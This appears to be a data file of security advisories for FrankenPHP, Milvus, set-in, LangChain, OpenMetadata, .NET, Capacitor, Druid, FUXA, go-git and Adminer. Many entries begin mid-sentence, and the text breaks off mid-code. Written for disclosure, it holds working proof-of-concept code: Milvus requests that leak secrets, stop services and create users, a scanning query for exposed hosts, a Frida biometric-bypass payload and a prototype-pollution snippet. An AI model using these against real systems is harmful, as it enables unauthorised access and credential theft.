**Output:**\n\n```text\norig bytes=26\nlower bytes=30\nsplitPos=22\norig[:pos]=\"/ȺȺȺȺshell.php.txt\"\norig[pos:]=\".php\"\nexpected splitPos=18\nexpected orig[:]=\"/ȺȺȺȺshell.php\"\n```\n\nIn this example, FrankenPHP would identify `/ȺȺȺȺshell.php.txt` as the PHP script to execute, ignoring the fact that the actual file extension in the file system might be `.txt`.\n\n### Impact*\n\nThis is a **Security Boundary Bypass** and **Path Confusion** vulnerability.\n\nIn setups where users can upload files (e.g., avatars, text files) that are stored within the document root or a reachable path, an attacker can upload a file containing malicious PHP code with a safe extension (e.g., `payload.txt`). By crafting a request with specific Unicode characters, the attacker can force FrankenPHP to calculate the `SCRIPT_FILENAME` as ending in `payload.txt`, while the request appears to contain `.php` to the internal router logic.\n\nThis results in the execution of non-PHP files as PHP scripts, leading to **Remote Code Execution (RCE)**.\n\n### **Patched Versions**\n\n* This issue is fixed in FrankenPHP version **1.11.2**.\n\n### **Workarounds**\n\n* Ensure that user-uploaded files are stored outside of the public document root.\n* Implement strict WAF rules to reject requests containing specific multi-byte Unicode characters in the URL path if an upgrade is not immediately possible.",

This allows a subsequent request processed by the same worker to access the `$_SESSION` data of the previous request (potentially belonging to a different user) before `session_start()` is called.\n\n### Details\n\nIn standard PHP execution, the environment is torn down completely after every request. In FrankenPHP's worker mode, the application stays in memory, and superglobals are manually reset between requests.\n\nThe vulnerability exists because `$_SESSION` is stored in the Zend Engine's symbol table (`EG(symbol_table)`). While the standard PHP request shutdown (RSHUTDOWN) decrements the reference count of the session data, it does not remove the `$_SESSION` variable itself from the symbol table. FrankenPHP's reset logic (`frankenphp_reset_super_globals`) previously cleared other superglobals but failed to explicitly delete `$_SESSION`.\n\nConsequently, until `session_start()` is called in the new request (which re-initializes the variable), the `$_SESSION` array retains the data from the previous request processed by that specific worker thread.\n\n### Impact\n\nThis is a **cross-request data leakage** vulnerability.\n\n* **Confidentiality:** If an application reads `$_SESSION` before calling `session_start()`, it can access sensitive information (authentication tokens, user IDs, PII) belonging to the previous user.\n* **Logic Errors / Impersonation:** If application logic relies on `$_SESSION` being empty or unset to detect a \"guest\" state, or checks for specific keys in `$_SESSION` prior to session initialization, a malicious actor (or accidental race condition) could trigger privilege escalation or user impersonation.\n\nThis affects only users running FrankenPHP in **worker mode** and not `session_start()` for each request, which is done by default by most frameworks.\n\n### PoC\n\nThe following steps demonstrate the issue (derived from the regression tests added in the fix):\n\n1. **Client A** sends a request that starts a session and sets sensitive data:\n\n```php\n// Request 1\nsession_start();\n$_SESSION['secret'] = 'AliceData';\nsession_write_close();\n```\n\n2. **Client B** (or the same client without cookies) sends a request to the same worker. This script checks `$_SESSION` *without* starting a session:\n\n```php\n// Request 2\n// session_start() is NOT called\nif (!empty($_SESSION)) {\n    echo \"Leaked Data: \" . $_SESSION['secret'];\n}\n```\n\n\n3. **Result:** Client B receives \"Leaked Data: AliceData\".\n\n### Workarounds\n\n* Ensure `session_start()` is called immediately at the entry point of your worker script to overwrite any residual data (though this may not cover all edge cases if middleware runs before the controller).\n* Manually unset `$_SESSION` at the very beginning of the worker loop, before handling the request.",

          "html": "## Summary\n\nMilvus exposes TCP port 9091 by default with two critical authentication bypass vulnerabilities:\n\n1. The `/expr` debug endpoint uses a weak, predictable default authentication token derived from `etcd.rootPath` (default: `by-dev`), enabling arbitrary expression evaluation.\n2. The full REST API (`/api/v1/*`) is registered on the metrics/management port without any authentication, allowing unauthenticated access to all business operations including data manipulation and credential management.\n\n## Details\n\n### Vulnerability 1: Weak Default Authentication on `/expr` Endpoint\n\nThe `/expr` endpoint on port 9091 accepts an `auth` parameter that defaults to the `etcd.rootPath` value (`by-dev`). This value is well-known and predictable. An attacker who can reach port 9091 can evaluate arbitrary internal Go expressions, leading to:\n\n- **Information/Credential Disclosure**: Reading internal configuration values (MinIO secrets, etcd credentials) and user credential hashes via `param.MinioCfg.SecretAccessKey.GetValue()`, `rootcoord.meta.GetCredential(ctx, 'root')`, etc.\n- **Denial of Service**: Invoking `proxy.Stop()` to shut down the proxy service.\n- **Arbitrary File Write (potential RCE)**: Manipulating access log configuration parameters to write arbitrary content to arbitrary file paths on the server filesystem.\n\n### Vulnerability 2: Unauthenticated REST API on Metrics Port\n\nBusiness-logic HTTP handlers (collection management, data insertion, credential management) are registered on the metrics/management HTTP server at port 9091 via `registerHTTPServer()` in [`internal/distributed/proxy/service.go` (line 170)](https://github.com/milvus-io/milvus/blob/9996e8d1cebff7e7108bcb16d43124236de77438/internal/distributed/proxy/service.go#L170). These endpoints do not enforce any authentication, even when Milvus authentication is enabled on the primary gRPC/HTTP ports.\n\nAn attacker can perform any business operation without credentials, including:\n\n- Creating, listing, and deleting collections\n- Inserting and querying data\n- Creating, listing, and deleting user credentials\n- Modifying user passwords\n\n## Proof of Concept\n\n### PoC 1 — `/expr` Endpoint Exploitation\n\n```python\nimport requests\n\nurl = \"http://<target>:9091/expr\"\n\n# Leak sensitive configuration (e.g., MinIO secret key)\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"param.MinioCfg.SecretAccessKey.GetValue()\"\n}, timeout=5)\nprint(res.json().get(\"output\", \"\"))\n\n# Retrieve hashed credentials for the root user\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"rootcoord.meta.GetCredential(ctx, 'root')\"\n}, timeout=5)\nprint(res.json().get(\"output\", \"\"))\n\n# Denial of Service — stop the proxy\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"proxy.Stop()\"\n}, timeout=5)\n\n# Arbitrary file write (potential RCE)\nfor cmd in [\n    'param.Save(\"proxy.accessLog.localPath\", \"/tmp\")',\n    'param.Save(\"proxy.accessLog.formatters.base.format\", \"whoami\")',\n    'param.Save(\"proxy.accessLog.filename\", \"evil.sh\")',\n    'querycoord.etcdCli.KV.Put(ctx, \"by-dev/config/proxy/accessLog/enable\", \"true\")'\n]:\n    requests.get(url, params={\"auth\": \"by-dev\", \"code\": cmd}, timeout=5)\n```\n\n### PoC 2 — Unauthenticated REST API Access\n\n```python\nimport requests\n\ntarget_url = \"http://<target>:9091\"\n\n# Create a user without any authentication\nres = requests.post(f\"{target_url}/api/v1/credential\", json={\n    \"username\": \"attacker_user\",\n    \"password\": \"MTIzNDU2Nzg5\",\n})\nprint(res.json())\n\n# List all users\nres = requests.get(f\"{target_url}/api/v1/credential/users\")\nprint(res.json())  # {'status': {}, 'usernames': ['root', 'attacker_user']}\n\n# Create and delete collections, insert data — all without authentication\n```\n\n## Internet Exposure\n\nA significant number of publicly exposed Milvus instances are discoverable via internet-wide scanning using the pattern:\n\n```\nhttp.body=\"404 page not found\" && port=\"9091\"\n```\n\nThis indicates the vulnerability is actively exploitable in real-world production environments.\n\n## Impact\n\nAn unauthenticated remote attacker with network access to port 9091 can:\n\n1. **Exfiltrate secrets and credentials** — MinIO keys, etcd credentials, user password hashes, and all internal configuration values.\n2. **Manipulate all data** — Create, modify, and delete collections, insert or remove data, bypassing all application-level access controls.\n3. **Manage user accounts** — Create administrative users, reset passwords, and escalate privileges.\n4. **Cause denial of service** — Shut down proxy services, drop databases, or corrupt metadata.\n5. **Write arbitrary files** — Potentially achieve remote code execution by writing malicious files to the filesystem via access log configuration manipulation.\n\n## Remediation\n\n### Recommended Fixes\n\n1. **Remove or disable the `/expr` endpoint** in production builds. If retained for debugging, it must require strong, non-default authentication and be disabled by default.\n2. **Do not register business API routes on the metrics port.** Separate the metrics/health endpoints from the application REST API to ensure authentication middleware applies consistently.\n3. **Bind port 9091 to localhost by default** (`127.0.0.1:9091`) so it is not externally accessible unless explicitly configured.\n4. **Enforce authentication on all API endpoints**, regardless of which port they are served on.\n\n### User Mitigations (until patched)\n\n- Block external access to port 9091 using firewall rules or network policies.\n- If running in Docker/Kubernetes, do not expose port 9091 outside the internal network.\n- Change the `etcd.rootPath` from the default value `by-dev` to a strong, random value (partial mitigation only — does not address the unauthenticated REST API).\n\n## Credit\n\nThis vulnerability was discovered and responsibly reported by **YingLin Xie** (xieyinglin@hust.edu.cn). It was independently reported by [0x1f](https://github.com/0x1f) and zznQ ([ac0d3r](https://github.com/ac0d3r)).",

Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using Array.prototype. This has been fixed in version 2.0.5.\n\n### Details\nThe vulnerability resides in line 28 of https://github.com/ahdinosaur/set-in/blob/master/index.js where includes() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of set-in using npm install or cloning from git\n2. Run the following code snippet:\n\n```javascript\nArray.prototype.includes = () => false; \nconst si = require('set-in');\nconst obj = {};\nconsole.log({}.polluted);\nsi(obj, [\n    'constructor',\n    'prototype',\n    'polluted'\n], 'yes');\nconsole.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how set-in is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service\n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)",

Its `preventOutside` option (enabled by default) is intended to restrict crawling to the same site as the base URL.\n\nThe implementation used `String.startsWith()` to compare URLs, which does not perform semantic URL validation. An attacker who controls content on a crawled page could include links to domains that share a string prefix with the target (e.g., `https://example.com.attacker.com` passes a `startsWith` check against `https://example.com`), causing the crawler to follow links to attacker-controlled or internal infrastructure.\n\nAdditionally, the crawler performed no validation against private or reserved IP addresses. A crawled page could include links targeting cloud metadata services (`169.254.169.254`), localhost, or RFC 1918 addresses, and the crawler would fetch them without restriction.\n\n## Impact\n\nAn attacker who can influence the content of a page being crawled (e.g., by placing a link on a public-facing page, forum, or user-generated content) could cause the crawler to:\n\n- Fetch cloud instance metadata (AWS, GCP, Azure), potentially exposing IAM credentials and session tokens\n- Access internal services on private networks (`10.x`, `172.16.x`, `192.168.x`)\n- Connect to localhost services\n- Exfiltrate response data via attacker-controlled redirect chains\n\nThis is exploitable in any environment where `RecursiveUrlLoader` runs on infrastructure with access to cloud metadata or internal services — which includes most cloud-hosted deployments.\n\n## Resolution\n\nTwo changes were made:\n\n1. **Origin comparison replaced.** The `startsWith` check was replaced with a strict origin comparison using the URL API (`new URL(link).origin === new URL(baseUrl).origin`). This correctly validates scheme, hostname, and port as a unit, preventing subdomain-based bypasses.\n\n2. **SSRF validation added to all fetch operations.** A new URL validation module (`@langchain/core/utils/ssrf`) was introduced and applied before every outbound fetch in the crawler. This blocks requests to:\n   - **Cloud metadata endpoints:** `169.254.169.254`, `169.254.170.2`, `100.100.100.200`, `metadata.google.internal`, and related hostnames\n   - **Private IP ranges:** `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`\n   - **IPv6 equivalents:** `::1`, `fc00::/7`, `fe80::/10`\n   - **Non-HTTP/HTTPS schemes** (`file:`, `ftp:`, `javascript:`, etc.)\n\nCloud metadata endpoints are unconditionally blocked and cannot be overridden.\n\n## Workarounds\n\nUsers who cannot upgrade immediately should avoid using `RecursiveUrlLoader` on untrusted or user-influenced content, or should run the crawler in a network environment without access to cloud metadata or internal services.",

          "html": "## Server-Side Request Forgery (SSRF) in ChatOpenAI Image Token Counting\n\n### Summary\nThe `ChatOpenAI.get_num_tokens_from_messages()` method fetches arbitrary `image_url` values without validation when computing token counts for vision-enabled models. This allows attackers to trigger Server-Side Request Forgery (SSRF) attacks by providing malicious image URLs in user input.\n\n### Severity\n**Low** - The vulnerability allows SSRF attacks but has limited impact due to:\n- Responses are not returned to the attacker (blind SSRF)\n- Default 5-second timeout limits resource exhaustion\n- Non-image responses fail at PIL image parsing\n\n### Impact\nAn attacker who can control image URLs passed to `get_num_tokens_from_messages()` can:\n- Trigger HTTP requests from the application server to arbitrary internal or external URLs\n- Cause the server to access internal network resources (private IPs, cloud metadata endpoints)\n- Cause minor resource consumption through image downloads (bounded by timeout)\n\n**Note:** This vulnerability occurs during token counting, which may happen outside of model invocation (e.g., in logging, metrics, or token budgeting flows).\n\n### Details\nThe vulnerable code path:\n1. `get_num_tokens_from_messages()` processes messages containing `image_url` content blocks\n2. For images without `detail: \"low\"`, it calls `_url_to_size()` to fetch the image and compute token counts\n3. `_url_to_size()` performs `httpx.get(image_source)` on any URL without validation\n4. Prior to the patch, there was no SSRF protection, size limits, or explicit timeout\n\n**File:** `libs/partners/openai/langchain_openai/chat_models/base.py`\n\n### Patches\nThe vulnerability has been patched in `langchain-openai==1.1.9` (requires `langchain-core==1.2.11`).\n\nThe patch adds:\n1. **SSRF validation** using `langchain_core._security._ssrf_protection.validate_safe_url()` to block:\n   - Private IP ranges (RFC 1918, loopback, link-local)\n   - Cloud metadata endpoints (169.254.169.254, etc.)\n   - Invalid URL schemes\n2. **Explicit size limits** (50 MB maximum, matching OpenAI's payload limit)\n3. **Explicit timeout** (5 seconds, same as `httpx.get` default)\n4. **Allow disabling image fetching** via `allow_fetching_images=False` parameter\n\n### Workarounds\nIf you cannot upgrade immediately:\n\n1. **Sanitize input:** Validate and filter `image_url` values before passing messages to token counting or model invocation\n2. **Use network controls:** Implement egress filtering to prevent outbound requests to private IPs",

This enables destructive changes in OpenMetadata instances, and potential data leakage (e.g. sample data, or service metadata which would be unavailable per roles/policies). \n\n\n### PoC\nI was able to extract the JWT used by the bot/agent populating [sample_athena.default](https://sandbox.open-metadata.org/database/sample_athena.default) in the Collate Sandbox. To prove this out, I mutated the description to this UUID: `fe2e4cc1-da72-4acf-8535-112a3cfa9c7e,` which you can see  @ https://sandbox.open-metadata.org/database/sample_athena.default.\n\n#### Steps to Reproduce\n\n* Create a Collate Sandbox account; these are non-admin accounts by default with minimal permissions.\n* Open the Developer Console\n* Go to the Services Page. In this case, [sample_athena](https://sandbox.open-metadata.org/service/databaseServices/sample_athena?showDeletedTables=false&currentPage=1), though other services \n* In the Network tab, introspect the request made to api/v1/services/ingestionPipelines, and find the jwtToken in the response:\n<img width=\"1329\" height=\"299\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0c405776-159e-4188-9591-ed8cc71bc596\" />\n\n* Use the JWT to issue (potentially destructive) API calls\n<img width=\"3024\" height=\"1798\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ab40b528-4d2b-404b-8f8a-482a1693e179\" />\n\n* Resulting mutated description:\n<img width=\"622\" height=\"399\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3fa630ff-93b5-4b7d-8e3c-220f8a84a23a\" />\n\nNote that this is also the case for these services, among others:\n* [acme_nexus_redshift](https://sandbox.open-metadata.org/service/databaseServices/acme_nexus_redshift) \n* [sample_postgres](https://sandbox.open-metadata.org/service/databaseServices/sample_postgres)\n\n### Proposed Remediation\nRedact jwtToken in API payload.\nImplement role-based filtering - Only return JWT tokens to users with explicit admin/service account permissions\n(for Admins) Rotate Ingestion Bot Tokens in affected environments\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n* Vulnerability Type: Privilege Escalation\n* Risk: User impersonation, even for those with read-only access, can lead to destructive outcomes if malicious actors leverage the leaked JWT.",

This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nAn attacker could exploit this vulnerability by crafting a malicious payload that bypasses the security checks in the affected System.Security.Cryptography.Cose versions, potentially leading to unauthorized access or data manipulation.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/380\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nIf your application does not use System.Security.Cryptography.Cose it is not affected. By default, no .NET applications reference this component.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 10\"></a>.NET 10\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 10.0.0, <= 10.0.2 | 10.0.3\n\n### <a name=\".NET 9\"></a>.NET 9\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 9.0.0, <= 9.0.12 | 9.0.13\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 8.0.0, <= 8.0.1 | 8.0.2\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf an affected package listed in [affected software](#affected-software) or [affected packages](#affected-packages), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nTo update the Using the System.Security.Cryptography.Cose NuGet package, use one of the following methods:\n\nNuGet Package Manager UI in Visual Studio:\n- Open your project in Visual Studio.\n- Right-click on your project in Solution Explorer and select \"Manage NuGet Packages...\" or navigate to \"Project > Manage NuGet Packages\".\n- In the NuGet Package Manager window, select the \"Updates\" tab. This tab lists packages with available updates from your configured package sources.\n- Select the package(s) you wish to update. You can choose a specific version from the dropdown or update to the latest available version.\n- Click the \"Update\" button.\n\nUsing the NuGet Package Manager Console in Visual Studio:\n- Open your project in Visual Studio.\n- Navigate to \"Tools > NuGet Package Manager > Package Manager Console\".\n- To update a specific package to its latest version, use the following Update-Package command:\n\n```\nUpdate-Package -Id System.Security.Cryptography.Cose\n```\n\nUsing the .NET CLI (Command Line Interface):\n- Open a terminal or command prompt in your project's directory.\n- To update a specific package to its latest version, use the following add package command:\n\n```\ndotnet add package System.Security.Cryptography.Cose\n```\n\nOnce you have updated the nuget package reference you must recompile and deploy your application. Additionally we recommend you update your runtime and/or SDKs, but it is not necessary to patch the vulnerability.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new).

This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine",

          "html": "There is a potential issue with the [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library. \n\n---\n\n## Summary\n\nThe [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library was found to be subject to an authentication bypass as the current implementation of the `onAuthenticationSucceeded()` does not appear to handle a `CryptoObject`[^HackTricks1] [^SecuringBiometricAuthentication] as seen in the following code block starting from [line 88 in AuthActivity.java](https://github.com/Cap-go/capacitor-native-biometric/blob/main/android/src/main/java/ee/forgr/biometric/AuthActivity.java#L88):\n\n```java\n@Override\n    public void onAuthenticationSucceeded(\n        @NonNull BiometricPrompt.AuthenticationResult result\n    ) {\n        super.onAuthenticationSucceeded(result);\n        finishActivity(\"success\");\n    }\n```\n\nAs the current implementation only checks whether `onAuthenticationSucceeded()` was called and does not handle a `CryptoObject` the biometric authentication can be bypassed by hooking the `onAuthenticationSucceeded()` function. \n\n## PoC Video:\n\nhttps://github.com/user-attachments/assets/b7b5a2bc-21dc-4373-b371-84b002dae7a7\n\n## Environment:\n\nThe following steps were taken to create and deploy a Capacitor application using the `cap-go/capacitor-native-biometric library` for the purpose of verifying this finding. Note at the time of writing the `npx create-react-app` command broke, so I have provided two ways of creating and deploying the testing environment. Apparently React updated to version 19 caused a dependency issue as seen [here](https://github.com/facebook/create-react-app/issues/13715). If it is not fixed by the time you look at this PoC please use the yarn alternatives. \n\n1. Create a new Capacitor app by opening your terminal and run the following commands to create a new Capacitor app. For the sake of the disclosure I'll be using the name `capgo-poc`: \n\n```sh\nnpx create-react-app capgo-poc --template typescript\n```\n\nYarn Alternative:\n\n```sh\nnpm install --global yarn\nyarn create react-app capgo-poc --template typescript\n```\n\n2. Install dependencies by navigating into your app's directory and run the following command to install Capacitor's core dependencies:\n\n```sh\ncd capgo-poc\nnpm install @capacitor/core \nnpm install @capacitor/cli \nnpm install @capacitor/android\nnpm install @capgo/capacitor-native-biometric\nnpm install react\n```\n\nYarn Alternative:\n\n```sh\ncd capgo-poc\nyarn add @capacitor/core \nyarn add @capacitor/cli \nyarn add @capacitor/android\nyarn add @capgo/capacitor-native-biometric\nyarn add react\n```\n\n3. Initialise the project using the name `capgo-poc` and `com.capgo.poc`, and add the android platform by running the following commands:\n\n```sh\nnpx cap init\nnpx cap add android\n```\n\n4. Configure the android permissions by opening the `android/app/src/main/AndroidManifest.xml` file and add the necessary permissions:\n\n```xml\n<uses-permission android:name=\"android.permission.USE_BIOMETRIC\" />\n<uses-permission android:name=\"android.permission.USE_FINGERPRINT\" />\n```\n\n5. Implement Biometric Authentication, here is some basic code to use the biometric authentication feature. Modify the TSX file called `App.tsx` in `src/` and import the following code:\n\n```js\nimport React, { useState } from 'react';\nimport { NativeBiometric } from '@capgo/capacitor-native-biometric';\n\nconst App = () => {\n  // State to hold authentication status\n  const [authStatus, setAuthStatus] = useState<string | null>(null);\n\n  // Function to authenticate the user\n  const authenticateUser = async () => {\n    try {\n      const result = await NativeBiometric.verifyIdentity({\n        reason: 'For an application access',\n        title: 'Log in',\n        subtitle: '',\n        description: 'Verify yourself by biometrics',\n        useFallback: true,\n        maxAttempts: 3,\n      }).then(() => true)\n        .catch(() => false);\n\n      if (!result) {\n        setAuthStatus('failed');\n      } else {\n        setAuthStatus('success');\n      }\n    } catch (error) {\n      console.error('Error during biometric verification:', error);\n      setAuthStatus('error');\n    }\n  };\n\n  return (\n    <div>\n      <h1>CAP-GO Capacitor Native Biometric Authentication</h1>\n      <button onClick={authenticateUser}>Authenticate with Biometrics</button>\n\n      {/* Conditionally render based on authentication status */}\n      {authStatus === 'success' && <h2>CAP-GO Capacitor Native Biometric Authentication Success</h2>}\n      {authStatus === 'failed' && <h2>CAP-GO Capacitor Native Biometric Authentication Failed</h2>}\n      {authStatus === 'error' && <h2>Error during authentication</h2>}\n    </div>\n  );\n};\n\nexport default App;\n```\n\n6. Build the React project, synchronise it with the Android platform, and open the native Android project in Android Studio by running the following commands:\n\n```sh\nnpm run build\nnpx cap sync android \nnpx cap open android\n```\n\nYarn alternative:\n\n```sh\nyarn build\nnpx cap sync android \nnpx cap open android\n```\n\n## Exploitation:\n\nFor the purpose of demonstrating the vulnerability we will be using frida and a rooted emulator from android studio. Frida is a dynamic instrumentation toolkit used as part of pentesting mobile applications [^frida]. \n\nNote that a rooted emulator is not necessary, but is being used for simplicity to demonstrate the vulnerability. \n\n1. Copy the below frida script to a JavaScript file and run it to hook the `onAuthenticationSucceeded()` function, abusing the `null CryptoObject`. This can be done by running the following command:\n\n```sh\nfrida -U -l <PAYLOAD> -n 'capgo-poc'\n```\n\n### Payload\n```js\nJava.perform(function () {\n  hookBiometricPrompt();\n});\n\nfunction getBiometricAuthResult(resultObj, cryptoInst) {\n    var authenticationResultInst = resultObj.$new(cryptoInst, 0);\n    return authenticationResultInst;\n};\n\nfunction getBiometricPromptResult() {\n    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');\n    var cryptoInst = cryptoObj.$new(null);\n    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');\n    var authenticationResultInst = getBiometricAuthResult(authenticationResultObj, cryptoInst);\n    return authenticationResultInst\n};\n\nfunction hookBiometricPrompt() {\n    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');\n    console.log(\"Hooking BiometricPrompt.authenticate()...\");\n    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {\n        var authenticationResultInst = getBiometricPromptResult();\n        callback.onAuthenticationSucceeded(authenticationResultInst);\n    }\n};\n```\n\n[^SecuringBiometricAuthentication]: https://www.kayssel.com/post/android-8/\n[^HackTricks1]: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android#method-1-bypassing-with-no-crypto-object-usage\n[^frida]: https://frida.re/",

If the underlying LDAP server is configured to allow anonymous\nbinds, an attacker can bypass authentication by providing an existing username with an empty password. This allows unauthorized access to otherwise restricted Druid resources without valid credentials.\n\nThe vulnerability stems from improper validation of LDAP authentication responses when anonymous binds are permitted, effectively treating anonymous bind success as valid user authentication. \n\nImpact\n\nA remote, unauthenticated attacker can:\n  *  Gain unauthorized access to the Apache Druid cluster\n  *  Access sensitive data stored in Druid datasources\n  *  Execute queries and potentially manipulate data\n  *  Access administrative interfaces if the bypassed account has elevated privileges\n  *  Completely compromise the confidentiality, integrity, and availability of the Druid deployment                                                                                                                                                                                    \n\n\nMitigation\n \nImmediate Mitigation (No Druid Upgrade Required):                                                                                                                                                    \n  *  Disable anonymous bind on your LDAP server.

This leads to Remote Code Execution (RCE) when the server reloads the malicious scripts. It is a new vulnerability a patch bypass for the sanitization in the last release .\n\n\n### Details\nThis report describes a new, distinct vulnerability that differs from previous Path Traversal advisories (such as CVE-2023-31718) in several ways:\n\nPatch Bypass (Regression): The vulnerability circumvents the existing sanitization logic implemented to fix previous traversal issues. The current \"single-pass\" regex approach is insufficient against nested sequences.\nExpansion of Scope: Unlike previous reports that focused primarily on /api/download, this bypass affects multiple critical endpoints, including /api/upload, /api/resources/remove, and /api/logs.\nEscalation to RCE: By targeting the \nupload\n and remove functionalities, this vulnerability directly leads to Remote Code Execution, which is a higher impact than the information disclosure typically associated with previous traversal reports.\n\n\n### Impact\nRemote Code Execution (RCE): Transition from application admin to full system control.\nSCADA Operational Disruption: Potential for physical or operational sabotage by manipulating tags and alarms.\nData Integrity & Availability: Full access to projects, credentials, and historical logs.\n\n### Patches\n\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the latest available release.",

This resulted in `go-git` potentially consuming corrupted files, which would likely result in unexpected errors such as `object not found`.\n\nFor context, clients fetch [`packfiles`](https://git-scm.com/docs/pack-protocol#_packfile_data) from upstream Git servers. Those files contain a checksum of their contents, so that clients can perform integrity checks before consuming it. The pack indexes (`.idx`) are [generated](https://git-scm.com/docs/pack-format) locally by `go-git`, or the `git` cli, when new `.pack` files are received and processed. The integrity checks for both files were not being verified correctly.\n\nNote that the lack of verification of the packfile checksum has no impact on the trust relationship between the client and server, which is enforced based on the protocol being used (e.g. TLS in the case of `https://` or known hosts for `ssh://`). In other words, the packfile checksum verification does not provide any security benefits when connecting to a malicious or compromised Git server.\n\n### Patches\n\nUsers should upgrade to `v5.16.5`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.\n\n### Workarounds\n\nIn case updating to a fixed version of `go-git` is not possible, users can run [git fsck](https://git-scm.com/docs/git-fsck) from the `git` cli to check for data corruption on a given repository. \n\n### Credit\n\nThanks @N0zoM1z0 for finding and reporting this issue privately to the `go-git` project.",

This affects FUXA version 1.2.8 through version 1.2.10. This has been patched in FUXA version 1.2.11.\n\n### Impact\nThis affects all deployments with the Node-RED plugin enabled, including those with `runtime.settings.secureEnabled` set to true.\n\nExploitation allows an unauthenticated, remote attacker to send a specially crafted request to the `/nodered/flows` endpoint to bypass authentication checks, granting the attacker administrative access to the Node-RED deployment API. By submitting a malicious flow configuration, an attacker can execute arbitrary code in the context of the FUXA service. Depending on deployment configuration and permissions, this may lead to full system compromise and could further expose connected ICS/SCADA environments to follow-on actions.\n\n### Patches\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the latest available release.",

          "html": "### Summary\nAdminer v5.4.1 has a version check mechanism where `adminer.org` sends signed version info via JavaScript postMessage, which the browser then POSTs to `?script=version`. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST `version[]` parameter which PHP converts to an array. On next page load, `openssl_verify()` receives this array instead of string and throws `TypeError`, returning HTTP 500 to all users.\n\n### Fix\n\nUpgrade to Adminer 5.4.2.\n\n**Mitigation** (if you can't upgrade): Make file `adminer.version` in temp directory (usually the value of [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) unwritable by web server.\n\n### Details\n\n**1. Intended design of `?script=version`:**\n\nThe endpoint is designed to receive version data from `adminer.org` via browser JavaScript:\n- `functions.js` line 102-117: Creates iframe to `https://www.adminer.org/version/`\n- Adminer.org sends signed version data via `postMessage`\n- JavaScript POSTs this to `?script=version`\n- Server stores in `/tmp/adminer.version` for signature verification\n\n```javascript\n// functions.js line 117\najax(url + 'script=version', () => { }, event.data + '&token=' + token);\n```\n\n**2. The vulnerability:**\n\nThe endpoint only checks `$_GET[\"script\"] == \"version\"` - it does not validate:\n- Request origin (no CSRF token check for this endpoint)\n- Request source (any HTTP client can POST)\n- Parameter types (`version` expected as string, array not rejected)\n\n```php\n// bootstrap.inc.php line 32-40\nif ($_GET[\"script\"] == \"version\") {\n    $filename = get_temp_dir() . \"/adminer.version\";\n    @unlink($filename);\n    $fp = file_open_lock($filename);\n    if ($fp) {\n        file_write_unlock($fp, 